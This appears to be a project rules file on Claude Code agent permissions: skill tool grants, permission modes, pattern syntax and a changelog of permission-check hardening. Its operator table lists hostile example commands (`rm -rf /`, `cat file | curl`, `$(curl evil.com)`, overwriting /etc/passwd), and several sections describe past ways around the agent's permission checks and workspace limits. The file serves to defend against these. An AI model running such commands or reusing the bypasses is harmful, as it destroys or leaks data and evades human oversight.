---
created: 2026-01-16
modified: 2026-11-06
reviewed: 2026-11-06
paths:
  - "**/skills/**"
  - "**/SKILL.md"
  - "**/agents/**"
---

# Agentic Permissions

Skills should use granular `allowed-tools` permissions to enable seamless, deterministic execution without interactive approval prompts. The granular patterns in this rule are also the patterns that survive auto mode — see `.claude/rules/auto-mode.md`.

## Permission Modes

Claude Code now ships several permission modes. The relevant ones for skill authoring are:

| Mode | What runs without asking | Skill-authoring impact |
|------|--------------------------|------------------------|
| `default` ("Manual" as of 2.1.200) | Reads only | Granular `allowed-tools` is the only way to avoid prompts. `--permission-mode manual` / `"defaultMode": "manual"` are accepted aliases. |
| `acceptEdits` | Reads, file edits, common filesystem commands (`mkdir`, `touch`, `mv`, `cp`, `sed`, etc.) | Bash skills still benefit from narrow `Bash(<command> *)` patterns. |
| `auto` | Everything that survives a classifier review | The starting mode when none is configured for interactive terminal and VS Code sessions (2.1.284). `-p`/SDK sessions start in `default` again on third-party providers, with telemetry off, or on a fresh install (2.1.302 reversed the 2.1.285 auto default); pass `--permission-mode auto` (`auto-mode.md`). Broad allow rules are dropped on entering auto mode and narrow ones carry over (`auto-mode.md` § What Happens to Allow Rules on Entering Auto Mode). |
| `dontAsk` | Pre-approved tools only | Without granular `allow` rules, the skill cannot run. |
| `bypassPermissions` | Everything, including protected paths (2.1.126) | No safety layer — granular permissions are unenforced but still document intent. |

**`bypassPermissions` no longer excepts protected paths.** Through 2.1.78,
`.git`, `.claude`, and other protected directories were writable without a
prompt in `bypassPermissions` mode — a gap that release closed. 2.1.121 then
carved `.claude/skills/`, `.claude/agents/`, and `.claude/commands/` back out
of the prompt (matching the classifier's own auto-mode carve-out), and 2.1.126
broadened that carve-out to essentially all paths: `--dangerously-skip-permissions`
now bypasses prompts for writes to `.claude/`, `.git/`, `.vscode/`, shell
config files, and other previously-protected paths. The only surviving safety
net is catastrophic removal commands (e.g. `rm -rf ~`), which still prompt in
bypass mode — as of 2.1.208 that prompt also fires when the removal is wrapped
in `$(…)`/backticks/`<(…)` instead of typed plainly. Protected-path prompting
still holds under `default`, `acceptEdits`, and `auto` — it is specifically
`bypassPermissions` that stopped honouring it. Separately, 2.1.257 made a
project-level `defaultMode: "bypassPermissions"` (in `.claude/settings.json`
or `.claude/settings.local.json`) **ignored**, like `"auto"`; set it in user
or managed settings, or pass `--permission-mode` instead.

`--restricted` (or `CLAUDE_CODE_RESTRICTED=1`, 2.1.248) is a separate,
harness-level lockdown rather than a `permissionMode` value: it removes the
built-in tools that run commands or code and `WebFetch` (unless named in
`--tools`), keeps file tools inside the working directory, **refuses
`bypassPermissions` outright**, and ignores user, project, and local settings
files. A skill that depends on `Bash` or on `bypassPermissions` cannot run
under it. Before 2.1.295, `--tools` and `--restricted` did not cover built-in
tools that registered after launch, and deprecated tool names reached tools
outside the caller's tool set.

Since 2.1.296, Edit and NotebookEdit **refuse** a file that is not valid UTF-8
(Windows-1252, Shift-JIS, GBK); before, they replaced every non-ASCII character.
A skill that edits legacy-encoded files must convert them first or write them
another way.

See `.claude/rules/auto-mode.md` for the full auto-mode model (decision order, dropped-rule list, conversation boundaries, subagent behaviour, deny-and-continue thresholds).

> **Note (2.1.160)**: `acceptEdits` mode now **prompts before writing build-tool config files** — `.npmrc`, `.yarnrc*`, `bunfig.toml`, `.bazelrc`, `.pre-commit-config.yaml`, `.devcontainer/`, and similar — even though it auto-accepts ordinary edits. These files can execute code or alter the toolchain on the next build, so they are gated like a privileged write. A skill that legitimately edits one of them under `acceptEdits` should expect the prompt (or carry an explicit `Edit(<path>)` allow rule).

> **Note (2.1.152)**: Skills and slash commands can set `disallowed-tools` in frontmatter to **remove** tools while the skill is active — the subtractive complement to `allowed-tools`. Use it to keep a focused skill from reaching for capabilities it shouldn't (see `.claude/rules/skill-development.md` § Optional Frontmatter Fields).

## Skill `allowed-tools` is a pre-approval, so the standard is narrow patterns

This section is the single record of the skill grant model. `auto-mode.md` and `skill-development.md` link here rather than restating it.

**What the field does.** The Claude Code skills reference defines `allowed-tools` as "Tools Claude can use without asking permission during the turn that invokes this skill. The grant clears when you send your next message." ([skills § Pre-approve tools for a skill](https://code.claude.com/docs/en/skills#pre-approve-tools-for-a-skill)). It adds to the session's grants and restricts nothing: every tool stays callable, and the session's permission settings still govern the tools a skill does not list. Workspace trust does not gate it, so a project skill's grant applies even in a `-p` run in a folder never trusted. Managed `allowManagedPermissionRulesOnly` withholds it (`skill-development.md` § Permission Patterns lists which skill sources keep it). To take tools away while a skill is active, use `disallowed-tools`.

**The house standard is narrow patterns** (decided 2026-11-01 on #2839). List the commands the skill runs as `Bash(<command> *)`. A bare `Bash` pre-approves every shell command for the invoking turn, whatever the skill body or a tool result steers the model toward, so it is a full shell grant. A command the author did not predict is not blocked by a narrow list; it goes through the normal permission flow (a prompt in `default`, the classifier in `auto`).

| Grant in a skill | Pre-approved for the invoking turn |
|---|---|
| `Bash(git status *), Bash(gh pr view *)` | Those commands |
| `Bash(bash ${CLAUDE_SKILL_DIR}/scripts/check.sh *)` | The skill's own bundled script. Claude Code substitutes `${CLAUDE_SKILL_DIR}` in `allowed-tools` Bash rules; the docs' example is the direct form `Bash(${CLAUDE_SKILL_DIR}/scripts/render.sh *)`. Invoke the script in the body exactly as the rule spells it |
| `Bash(bash *)`, `Bash(sh *)` | Any `bash -c '<script>'` by prefix match, so nearly as much as a bare `Bash`. Avoid |
| `Bash` | Every shell command. Non-conforming |

About 220 skills still carry a bare `Bash` (an awk pass over each tracked plugin `SKILL.md`'s one-line `allowed-tools`, 2026-11-06). They migrate under #3464, which also adds the lint; until then, do not add new ones. The skills reference does not say whether auto mode's broad-rule drop applies to a skill's turn grant, so do not rely on it either way.

### The other defect: a `Bash` grant in a skill with no shell to run

A skill that grants `Bash` in any form while its body runs no shell advertises a capability it never exercises and pre-approves commands nothing in it needs.

`scripts/check-unused-bash-grant.sh` is the lint; it checks bare `Bash` grants only, so a narrow `Bash(...)` grant in a skill with no shell is a review finding. A skill counts as running shell if it has a fenced command block (including an **unlabeled** fence, or one whose commands start `./` or `.venv/`), a known command in inline backticks, a sibling `scripts/` directory, a `` !`…` `` context command, or shell in a bundled sidecar (`REFERENCE.md`, `references/**`) — a progressive-disclosure skill is not inert just because its commands live one file over.

A flagged skill drops `Bash` entirely. A skill that does run shell lists the commands it runs, as the house standard in this section says.

## Permission Syntax

### Frontmatter Format

```yaml
allowed-tools: Bash(git status *), Bash(gh pr *), Read, TodoWrite
```

- Uses **space separator** between command and wildcard: `Bash(command *)`
- **Prefix matching**: `Bash(git diff *)` matches `git diff`, `git diff --cached`, `git diff --stat`
- Comma-separated list of tool permissions
- **`ask` tier**: Use `ask` to prompt the user for confirmation (neither auto-allow nor auto-deny):
  ```yaml
  allowed-tools: Bash(git push *):ask, Bash(git status *), Read
  ```
  The `:ask` suffix on a pattern means Claude can use the tool but will always prompt for confirmation.

### Pattern Examples

| Pattern | Matches |
|---------|---------|
| `Bash(git status *)` | `git status`, `git status --porcelain`, `git status -s` |
| `Bash(gh pr *)` | `gh pr view`, `gh pr checks`, `gh pr list --json` |
| `Bash(gh run *)` | `gh run view`, `gh run list`, `gh run view --log-failed` |
| `Bash(npm run *)` | `npm run test`, `npm run build`, `npm run lint` |
| `Skill(git-*)` | `git-commit`, `git-rebase`, `git-pr-create` (2.1.139+) |
| `Skill(*)` | Every skill (2.1.139+) |

> **Note (2.1.139)**: `Skill(<name> *)` permission rules use prefix matching, just like `Bash(<command> *)` — matching `Bash(ls *)` behavior. Before 2.1.139, wildcards inside `Skill(...)` were treated as literal characters and silently failed to match (only the bare `Skill(*)` form worked).

> **Note (2.1.282/2.1.283)**: `anthropic-skills` is a reserved namespace. `Skill(anthropic-skills:*)` allow rules cover only claude.ai-synced skills, and a `Skill(anthropic-skills:<name>)` deny also blocks the skill when Claude Desktop delivers it as a plugin. `Skill(skill:<name>)` denies match the skill's alias and display name.

> **Note (2.1.246)**: never put the wildcard **before** the subcommand, e.g. `Bash(git * main)` — Claude Code now warns about this pattern at startup because it also matches options inserted before the subcommand (e.g. `git --exec-path=... main`). Keep the wildcard at the end: `Bash(git main *)` / `Bash(git status *)`.

> **Note (2.1.282)**: Bash rules with a mid-pattern `:*` now apply from every settings source (they were skipped in settings files before), with a startup warning explaining how they match.

### Parameter-Matching Rules — `Tool(param:value)` (2.1.178+)

Permission rules can match a tool's **input parameters**, not just its name, with the `Tool(param:value)` syntax (the value supports a `*` wildcard):

| Rule | Matches |
|------|---------|
| `Agent(model:opus)` | Any `Agent` (subagent) call requesting the Opus model — put it in `deny` to block Opus subagents |
| `Agent(model:*)` | Any `Agent` call that sets a model parameter |
| `WebFetch(domain:*.example.com)` | A `WebFetch` to any subdomain of `example.com` (see wildcard note below) |

Pair `Agent(model:...)` deny rules with the pre-launch classifier check (`.claude/rules/agent-development.md` § Subagent Nesting Depth) to govern which subagents a session may spawn. `Agent(type)` deny rules and `Agent(x,y)` allowed-types restrictions are enforced for named subagent spawns only since 2.1.186. Admins can restrict models for the whole session with the managed `deniedModels` and `availableModelsMatch: "exact"` settings (2.1.283).

### Wildcard and Glob Matching (2.1.166+ / 2.1.172+ / 2.1.178+ / 2.1.214 / 2.1.281 / 2.1.299)

A run of fixes made wildcard/glob handling in permission rules behave as written:

| Version | Fix |
|---------|-----|
| 2.1.166 | Glob patterns are supported in the **deny** rule tool-name position — `"*"` denies **all** tools. Allow rules **reject** non-MCP globs (a glob tool-name in an allow rule is an error), and **unknown tool names in deny rules warn at startup** instead of silently never matching. |
| 2.1.172 | `WebFetch(domain:*.example.com)` wildcard domain rules now match **subdomains** (previously the leading `*.` failed to match). `Read(secrets-*/config.json)` and other **mid-pattern** wildcards are no longer rejected at startup. |
| 2.1.178 | MCP **server-level** specs (`mcp__server`, `mcp__server__*`, `mcp__*`) in a subagent's `disallowedTools` now work — previously only fully-qualified `mcp__server__tool` names matched, so server-wide denials silently let MCP tools through. |
| 2.1.214 | **BREAKING:** single-segment `dir/**` **allow** rules (e.g. `Edit(src/**)`) now match only `<cwd>/dir` — they no longer auto-approve a nested `dir/` anywhere in the tree. `deny`/`ask` rules keep their old any-depth match, so allow and deny/ask now genuinely differ for the same pattern shape. Write `**/dir/**` if you need any-depth **allow** matching. |
| 2.1.281 | A permission rule containing a NUL byte matches nothing. |
| 2.1.299 | **MCP allow rules cover only the server they name.** `mcp__a` no longer allows a server named `a__b` or `a_`; for a server whose normalized name contains `__`, write `mcp__<whole normalized name>__*` (the same in an agent's `tools:` list). Deny and ask rules for such a server now apply; they were silently ignored before, so an old deny on an `__`-named server was not protecting anything. |

## Shell Operator Protections

Claude Code 2.1.7+ includes built-in protections against dangerous shell operators in permission patterns. As of 2.1.59, the "always allow" permission prompt handles compound bash commands more accurately — each subcommand is evaluated against permission patterns individually.

### Protected Operators

These operators are blocked by default when matched against permission patterns:

| Operator | Risk | Example |
|----------|------|---------|
| `&&` | Command chaining | `ls && rm -rf /` |
| `\|\|` | Conditional execution | `false \|\| malicious` |
| `;` | Command separation | `safe; dangerous` |
| `\|` | Pipe to other commands | `cat file \| curl` |
| `>` / `>>` | Output redirection | `echo bad > /etc/passwd` |
| `$()` | Command substitution | `$(curl evil.com)` |
| `` ` `` | Backtick substitution | `` `rm -rf /` `` |

### Security Behavior

When a Bash command contains shell operators:
1. The entire command is evaluated, not just the prefix
2. Permission patterns like `Bash(git *)` won't match `git status && rm -rf`
3. Users see a clear warning about the blocked operator

2.1.223 fixed two further bypasses: a crafted command could hide parts of
itself from permission-pattern matching, and a command padded with tabs or
invisible Unicode could hide part of itself from the approval dialog the user
sees.

### Exec-Wrapper and Removal-Target Hardening (2.1.113)

- **Deny rules now see through exec wrappers.** A `Bash` deny rule matches a
  command wrapped in `env`, `sudo`, `watch`, `ionice`, `setsid`, and similar
  exec wrappers (`sudo rm -rf /`, `env git push --force`), instead of only the
  bare command.
- **macOS removal targets.** `/private/{etc,var,tmp,home}` paths are now
  treated as dangerous removal targets under `Bash(rm:*)` allow rules.
- **`find` allow rules narrowed.** `Bash(find:*)` allow rules no longer
  auto-approve `find -exec` or `find -delete` — those still prompt.

### Bash Permission-Check Hardening (2.1.214)

A further round tightened the permission analyzer itself:

- Commands using file-descriptor redirect forms the analyzer parses
  differently than bash now **fail closed** (prompt) instead of matching
  loosely.
- Commands over 10,000 characters always prompt instead of being evaluated
  for auto-approval.
- zsh variable subscripts and modifiers inside `[[ ]]` comparisons now
  prompt instead of being treated as inert text.
- Some `help`/`man` invocations that could run unsafe options, command
  substitutions, or backslash paths are no longer auto-approved.
- `docker`/Podman commands carrying daemon-redirect flags (`--url`,
  `--connection`, `--identity`, and Podman's remote mode) now prompt.
- `file -m`/`--magic-file` and `-f`/`--files-from` now require permission
  instead of being auto-allowed as read-only.
- A Windows PowerShell 5.1 permission-check bypass was fixed.
- (2.1.274) Commands that loop over or assign certain special shell variables now ask, and worktree-isolated sessions refuse Bash commands with certain nested shell expansions.
- (2.1.281) Recursive removes whose target comes only from command substitution (`rm -rf "$(pwd)"`), from `$VAR/topdir`, or from the cwd prompt even when a Bash allow rule matches (opt out: `CLAUDE_CODE_DISABLE_SUBSTITUTION_RM_PROMPT=1`). In auto and skip-permissions mode the dangerous-`rm` prompt waits 2 minutes, then denies with a rewrite hint (`CLAUDE_CODE_DISABLE_DANGEROUS_RM_TIMEOUT=1` disables the timeout).
- (2.1.287–2.1.288) The dangerous-`rm` always-ask holds when the same command also redirects to a `~` or wildcard path (2.1.287), and inside a `bash -c`/`sh -c` script in bypass mode or under a shell allow rule (2.1.288). Whole-tool `Bash` allow rules and allowing hooks prompt for shell writes to files the file tools refuse outright, such as the host credentials file (2.1.287).
- (2.1.288–2.1.296) Now prompt: a `BASHPID` assignment the shell would evaluate as arithmetic (2.1.288); read-only commands such as `rg` and `git grep` whose arguments the shell would expand as wildcards, `pyright`, which is no longer read-only, more forms of `ps`, and commands whose variable names zsh reads differently from bash (2.1.290); a `BASH_ARGV0` assignment that is then used (2.1.296). For-loops over glob patterns are checked more accurately since 2.1.295.
- (2.1.289–2.1.290) Under sandbox auto-allow, deny and ask rules no longer miss a command behind an env-var prefix with an expanded value (`TZ="$HOME" rm -rf build`) or a bare assignment (2.1.289); and deny and ask rules no longer miss a name taken from a variable set as a prefix on `declare`/`typeset`/`export`/`readonly` (2.1.290).
- (2.1.299) `rm` prompts on shell `-c` scripts that never run `rm` were fixed. A run-time-built `rm` inside a script Claude Code cannot read no longer prompts unless `CLAUDE_CODE_STRICT_INLINE_SHELL_RM_PROMPT=1`.
- (2.1.304) `rm -r` of a mounted drive or a top-level folder (`/Volumes`, `/media`, `/mnt/c`) gets the safety prompt.
- (2.1.309) Bypasses fixed: the Bash check no longer trusts a variable set by a command whose redirect can fail to open; a wrapped or prefixed `cd` before `git` in a compound command prompts, as a plain `cd` does; an `Edit(path)` deny blocks a Bash redirect to that path in commands that also contain a subshell; on Windows, PowerShell `Set-Location`/`cd` to the current directory with extra arguments prompts. In bypass mode in the Desktop app and VS Code, the dangerous-`rm` prompt denies at once with a rewrite hint.
- (2.1.309) `sed -i` gets the standard Bash prompt and runs as written, with no simulated file-edit preview, and `/rewind` no longer restores its edits, as with any other Bash edit. The `bash-antipatterns` hook's `sed -i` block keeps its exit 2 on correctness grounds (`hook-block-vs-nudge.md`).

### Working-Directory Bypass Hardening (2.1.149, revisited 2.1.271/2.1.273/2.1.280)

The permission analyzer tracks the working directory so a command cannot quietly escape the workspace and read outside it. Two 2.1.149 fixes closed bypasses:

- **PowerShell built-in `cd` forms.** `cd..`, `cd\`, `cd~`, and bare drive switches like `X:` changed the working directory undetected, letting a later command read outside the workspace. These now register as directory changes.
- **Stale variable tracking across `cd`/`pushd`/`popd`.** The analyzer previously trusted stale values for `PWD`, `OLDPWD`, and `DIRSTACK` after a directory change, leaving a gap where a path check used the wrong working directory. The tracking is now refreshed on each `cd`/`pushd`/`popd`.

These are harness-level guards, not an airtight boundary — the same class of
bypass kept resurfacing well past 2.1.149. 2.1.271 fixed Bash commands with two
directory changes, a subshell, or a `cd`+`git` chain skipping the
`permissions.blockReadsOutsideWorkingDirectories` prompt in bypass and auto
mode; 2.1.273 fixed commands the permission checker cannot fully analyze doing
the same, plus a subshell hiding a dangerous `rm` in bypass mode. Treat
`blockReadsOutsideWorkingDirectories` as best-effort, not an airtight boundary
against adversarial input, when authoring a security-sensitive skill.

Writes through a symlinked path are judged by where they land (2.1.280):
`acceptEdits`, allow rules and auto mode no longer approve a write whose real
target is outside the tree. Since 2.1.287 a shell write through a
repo-committed symlink onto a sensitive file, or out of the working tree,
names where it lands and waits for a person. Symlinks no longer route around
read rules: `Read` denies apply to files reached through a symlink by IDE
@-mention, selection or change (2.1.289), and a project `CLAUDE.md`, rule or
`AGENTS.md` symlinked outside the working directories no longer loads under
`blockReadsOutsideWorkingDirectories` or a `Read` deny (2.1.290).

`permissions.blockWritesOutsideWorkingDirectories` (2.1.314) is the write-side
sibling: Write, Edit and NotebookEdit refuse paths outside the working
directories in every permission mode. It covers the file tools; a Bash write is
governed by the shell checks above. `--restricted` sessions no longer upload
files from outside the working directories that a Read allow rule covered
(2.1.316).

Settings-source fixes: `--setting-sources` exclusion is complete since 2.1.314
(an excluded file used to still supply auto-mode rules and saved permission
consents). Claude's file tools ask before editing the local copy of the org's
server-managed settings (2.1.314); Team/Enterprise server-managed settings apply
without an approval prompt, and a stored copy that does not verify is refused
(2.1.316).

### Safe Patterns

```yaml
# These are safe - single commands only
allowed-tools: Bash(git status *), Bash(npm test *), Bash(bun run *)
```

### Scripts for Compound Operations

When a skill needs compound operations (validation checks, multi-step diagnostics, data aggregation), use **standalone shell scripts** instead of inline commands. This consolidates many granular permission patterns into one rule per bundled script.

**Anti-pattern** — many shell utility patterns that force inline bash:
```yaml
# Each generates complex inline commands requiring individual approval
allowed-tools: Bash(test *), Bash(jq *), Bash(head *), Bash(find *), Bash(cp *), Read
```

**Correct pattern** — a bundled script, pre-approved by a rule anchored to the skill's own directory:
```yaml
allowed-tools: Bash(bash ${CLAUDE_SKILL_DIR}/scripts/check-settings.sh *), Read, TodoWrite
```

Not `Bash(bash *)`: it prefix-matches any `bash -c '<script>'`, so it pre-approves nearly as much as a bare `Bash`.

Scripts live in `skills/<skill-name>/scripts/` and are invoked via:
```bash
bash "${CLAUDE_SKILL_DIR}/scripts/check-settings.sh" --home-dir "$HOME"
```

**No `$(…)` or backtick substitution on the invocation line.** It voids the anchored grant: the call prompts (measured on 2.1.322, #3577). Let the script default the value instead (`--project-dir` to the working directory). `scripts/check-voided-script-grant.sh` enforces it (#3640).

#### When to Use Scripts vs Granular Patterns

| Use granular `Bash(command *)` | Use a bundled script (one anchored rule) |
|-------------------------------|--------------------------------|
| Primary CLI tools (`git`, `gh`, `curl`, `npm`) | Shell utilities (`test`, `jq`, `find`, `cp`, `mkdir`) |
| Single-purpose commands | Multi-step validation/diagnostics |
| Commands that benefit from specific allowlisting | Compound operations needing `&&`, `||`, pipes |

#### Script Conventions

Scripts must follow these patterns (see `shell-scripting.md`):
- `#!/usr/bin/env bash` + `set -uo pipefail`
- Accept `--home-dir`, `--project-dir` for path portability
- Output structured `KEY=value` pairs with `=== SECTION ===` headers
- Use prefixed variable names (avoid reserved words)

## Design Principles

### 1. Granular Over Broad

Prefer specific command patterns over broad tool access, in a skill's `allowed-tools` and in `settings.json` alike (see [Skill `allowed-tools` is a pre-approval](#skill-allowed-tools-is-a-pre-approval-so-the-standard-is-narrow-patterns)):

```yaml
allowed-tools: Bash(git status *), Bash(git diff *), Bash(git add *), Read
```

### 2. Principle of Least Privilege

Only grant permissions needed for the command's purpose.

| Command Purpose | Appropriate Permissions |
|-----------------|------------------------|
| Read-only diagnostics | `Bash(git status *), Bash(gh pr view *), Read` |
| Commit workflow | Above + `Bash(git add *), Bash(git commit *)` |
| PR workflow | Above + `Bash(git push *), Bash(gh pr create *)` |

### 3. Deterministic Execution

Commands should run the same way every time. This means:
- Fixed command patterns in context sections
- JSON/porcelain output for machine parsing
- No ad-hoc piping that requires additional approval

## Standard Permission Sets

### Task-tool availability (2.1.233+)

On Opus 4.8, Sonnet 5, Fable 5/5.1, Mythos 5 and newer, Claude Code leaves
out `TodoWrite`, `TaskCreate`, `TaskGet`, `TaskUpdate` and `TaskList` unless
the session opts in — those models track multi-step work without a written
checklist, and the tool definitions cost context. Three opt-ins restore them,
each session-wide: `CLAUDE_CODE_ENABLE_TODO_TOOLS=1` exported before launch,
naming any one of the tools in `--allowedTools` (e.g. `--allowedTools
TaskCreate`), or listing them in `--tools`. Background sessions and Claude
Code on the web have them on every model. A subagent (and an in-process
teammate) has them only when the parent session does, whatever the subagent's
own model. Independently, `TodoWrite` is off in favour of the four Task tools;
`CLAUDE_CODE_ENABLE_TASKS=0` swaps back to the legacy `TodoWrite`.

Consequences for authors:

- A `--allowedTools … TodoWrite …` grant in a workflow **is the opt-in**, not
  dead weight — do not strip it on the theory that the tool is inert.
- An agent's `tools:` line or a skill's `allowed-tools:` line does not opt the
  session in. A body that *depends* on the task list must say so ("track
  progress in the task list when the session has the task tools; otherwise
  carry the checklist in your working notes") rather than assume the tool.
- Everywhere outside this section, link here instead of restating the
  mechanics.

### Git Read-Only

```yaml
allowed-tools: Bash(git status *), Bash(git diff *), Bash(git log *), Bash(git branch *), Bash(git remote *), Read, Grep, Glob
```

### Git Read-Write

```yaml
allowed-tools: Bash(git status *), Bash(git diff *), Bash(git log *), Bash(git branch *), Bash(git add *), Bash(git commit *), Bash(git restore *), Read, Edit, Grep, Glob, TodoWrite
```

### Git + GitHub CLI

```yaml
allowed-tools: Bash(git status *), Bash(git diff *), Bash(git log *), Bash(git add *), Bash(git commit *), Bash(git push *), Bash(gh pr *), Bash(gh run *), Bash(gh issue *), Read, Edit, Grep, Glob, TodoWrite
```

### CI/CD Diagnostics

```yaml
allowed-tools: Bash(gh pr checks *), Bash(gh pr view *), Bash(gh run view *), Bash(gh run list *), Bash(git status *), Bash(git diff *), Bash(git log *), Read, Grep, Glob, TodoWrite
```

### Security Checks

```yaml
allowed-tools: Bash(gitleaks *), Bash(pre-commit *), Bash(git status *), Read, Grep, Glob, TodoWrite
```

## Machine-Readable Output

Commands should use output formats optimized for AI parsing.

### Git Commands

| Operation | Command |
|-----------|---------|
| Status | `git status --porcelain=v2 --branch` |
| Diff stats | `git diff --stat --numstat` |
| Log | `git log --format='%H %s' -n 10` |
| Branch info | `git branch -vv --format='%(refname:short) %(upstream:short) %(upstream:track)'` |

### GitHub CLI Commands

| Operation | Command |
|-----------|---------|
| PR checks | `gh pr checks $N --json name,state,conclusion,detailsUrl` |
| PR details | `gh pr view $N --json number,title,state,mergeable,statusCheckRollup` |
| Run details | `gh run view $ID --json conclusion,status,jobs,createdAt` |
| Failed logs | `gh run view $ID --log-failed` |
| Issue details | `gh issue view $N --json number,title,body,state,labels,assignees` |

## Project Settings Recommendation

For projects using plugins with these patterns, recommend adding to `.claude/settings.json`:

```json
{
  "permissions": {
    "allow": [
      "Bash(gh pr *)",
      "Bash(gh run *)",
      "Bash(gh issue *)",
      "Bash(git status *)",
      "Bash(git diff *)",
      "Bash(git log *)",
      "Bash(git add *)",
      "Bash(git commit *)",
      "Bash(git push *)",
      "Bash(git branch *)",
      "Bash(git remote *)",
      "Bash(pre-commit *)",
      "Bash(gitleaks *)"
    ]
  }
}
```

These narrow rules carry over into auto mode and skip the classifier. Avoid broad patterns like `Bash(*)`: auto mode drops them (`auto-mode.md` § What Happens to Allow Rules on Entering Auto Mode), and they reduce safety in `default`/`acceptEdits`.

### Writes to Protected Paths

Claude Code's built-in classifier treats `.claude/**` as a protected directory (except for `.claude/commands`, `.claude/agents`, `.claude/skills`, and `.claude/worktrees` — see `auto-mode.md`). Writes route through the classifier in auto mode and prompt in lower modes. Subagents observe this denial as a hard block on `Edit`/`Write`, regardless of the parent session's permission mode.

An `Edit(<glob>)` allow rule in `settings.json` resolves at step 1 of the decision chain and overrides the protected-path check. Use this to carve out documentation directories under `.claude/` that should be subagent-writable:

```json
{
  "permissions": {
    "allow": [
      "Edit(.claude/rules/**)"
    ]
  }
}
```

One `Edit(<glob>)` rule covers **all** file-editing tools — `Edit`, `Write`, and `NotebookEdit`. A matching `Write(<glob>)` rule is dead weight: file permission checks only consult `Edit(path)` rules, so Claude Code warns on startup (`Write(...) is not matched by file permission checks — only Edit(path) rules are`) and ignores it. Do not pair a `Write(<glob>)` allow rule with the `Edit(<glob>)` one. The same startup warning fires for a `NotebookEdit(<glob>)` rule (also covered by `Edit(path)`) and for a `Glob(<glob>)` rule (2.1.210) — use `Read(<glob>)` in place of a `Glob(<glob>)` permission rule.

This repo carves out `.claude/rules/**` because the files there are documentation read by humans and injected into agent context — not configuration that affects the harness. Skills, agents, and commands directories are already in Claude Code's default carve-out for the same reason; rules belong in the same trust tier.

`.claude/rules/**` is a **multi-segment** glob (`rules` is nested under `.claude`), so it is unaffected by the 2.1.214 single-segment allow-glob narrowing above — it was already anchored at `<cwd>/.claude/rules`, not matching any-depth. The narrowing only bites a bare single-segment carve-out like `Edit(rules/**)`.

### `autoMode.hard_deny` (2.1.136+)

Rules in `autoMode.hard_deny` block unconditionally -- the classifier cannot override them regardless of user intent or allow exceptions:

```json
{
  "permissions": {
    "autoMode": {
      "hard_deny": ["Bash(rm -rf *)"]
    }
  }
}
```

Use `hard_deny` for security-critical operations that must never run in auto mode even when the user explicitly permits them. Contrast with `autoMode.soft_deny`, which the classifier can override for good reason.

### "Always Allow" Persistence Across Worktrees (2.1.211)

Interactive "Always allow" approvals now save at the **repository root**, so an
approval granted in one `git worktree` applies in sibling worktrees of the same
repo too — previously each worktree tracked approvals separately. See
`.claude/rules/agent-coworker-detection.md` for the broader worktree-sharing
picture this changes.

### Auto Mode Dialog Reasons (2.1.141+)

When auto mode surfaces a permission prompt, the dialog now explains **why** — including when a `permissions.ask` rule triggered the prompt. Previously, users saw a generic "Claude wants permission" prompt and had to infer which rule fired. Authors writing `:ask` patterns can rely on the dialog to surface their rule:

```yaml
allowed-tools: Bash(git push *):ask, Bash(git status *), Read
```

The dialog now shows "Matched `Bash(git push *):ask` — confirm before push", giving the human the context to decide.

### `permissions.defaultMode` in Background Sessions (2.1.143+)

Background sessions launched from `claude agents` honor `permissions.defaultMode` from `settings.json`. Before 2.1.143, the background launcher overrode the configured default and started every session in `auto` mode — which silently expanded the permission surface for users who had deliberately chosen a stricter default. The fix means stricter modes (`default`, `dontAsk`) now apply consistently to both foreground and background sessions.

### Hook-Driven Decisions: `updatedInput` and Plan Mode (2.1.299, 2.1.300)

`updatedInput` returned by a `PreToolUse` or `PermissionRequest` hook is validated like Claude's own tool input: unknown keys are dropped, and input the tool rejects denies the call (2.1.300; `hooks-reference.md`). A write that a `PreToolUse` hook allowed no longer runs in plan mode (2.1.299).

### OpenTelemetry `tool_decision` Fields (2.1.301, 2.1.302)

The `tool_decision` event gains `classifier_verdict`, `permission_mode` and `classifier_category`, which tell a classifier decision apart from a rule decision when auditing why a call ran or was refused.

Classifier model selection (2.1.302): `CLAUDE_CODE_AUTO_MODE_MODEL` picks the **client-side** classifier's model only, and a conversation too long for the server-side classifier's safety check is compacted instead of having every checked call denied; detail in `auto-mode.md`.

### MCP Config and Managed-Policy Changes (2.1.305–2.1.309)

- **Behaviour change (2.1.305):** `allowedMcpServers` no longer filters `managed-mcp.json` stdio servers that use `${VAR}` only in `env`. On upgrade, a server the allowlist used to leave out now loads; list it in `deniedMcpServers` to keep it off.
- Sandboxed commands and auto-accepted edits cannot modify the file passed with `--mcp-config` (2.1.309). A disabled MCP server is no longer reconnected by a later permission prompt in print and SDK sessions (2.1.309).
- Under `allowManagedPermissionRulesOnly`, plugins that Claude Desktop mounts by path lose their `allowed-tools` (2.1.305).
- `claude ultrareview` requires workspace trust (2.1.309): on a terminal it asks, otherwise it refuses. A script passes `--trust-workspace` (no value) or sets `CLAUDE_CODE_DISABLE_ULTRAREVIEW_TRUST_CHECK=1`.

### Hook `if` Condition Matching (2.1.147+)

`if`-gated permission rules whose condition targeted PowerShell commands — e.g. `PowerShell(git push*)` — never matched, so the gate silently never fired. 2.1.147 fixed the condition matching. If a skill or settings file relies on an `if`-conditioned rule against a PowerShell command to allow or prompt, that gate now evaluates correctly rather than being a no-op.

### Remote Control Disabled by API Key (2.1.139+)

Remote Control, `/schedule`, and claude.ai MCP connectors are disabled when any of `ANTHROPIC_API_KEY`, `apiKeyHelper`, or `ANTHROPIC_AUTH_TOKEN` is set. These features rely on the claude.ai session identity to route remote control commands and scheduled jobs; an API-key session has no such identity, so silently allowing the features would break in unintuitive ways. If you need remote control, sign in via the standard OAuth flow rather than configuring an API key.

### `disable-model-invocation` Refusal Wording (2.1.222)

As of 2.1.222, the refusal Claude receives when it tries to invoke a
`disable-model-invocation` skill now explicitly tells it to ask the user to
run the skill, rather than replicate the skill's workflow itself. This
reinforces the recommend-don't-delegate pattern in
`.claude/rules/pr-branch-sync.md` § "Gated siblings are recommended, never
delegated to" — a skill body that says "address it via `/git:pr-feedback`"
still fails silently as prose delegation; write the recommendation form
instead.

### `skillOverrides` and Skill Discoverability (2.1.129)

The session-level `skillOverrides` setting changes whether a skill is
discoverable at all: `off` hides it from both the model and `/`,
`user-invocable-only` hides it from the model only (leaving `/` access),
and `name-only` collapses its description. A skill author cannot assume
"my skill is always visible to the model" — an admin can restrict any skill
via this setting independent of the skill's own frontmatter.

## Context Section Patterns

Context commands use `!` backtick syntax and are subject to shell operator protections.

### Context Command Patterns

Context commands must use plain commands without shell operators. The `>` in `2>/dev/null` is blocked by shell operator protections, just like `||`, `&&`, `|`, and `;`.

Commands that fail produce empty output, which is acceptable — the context system handles missing context gracefully.

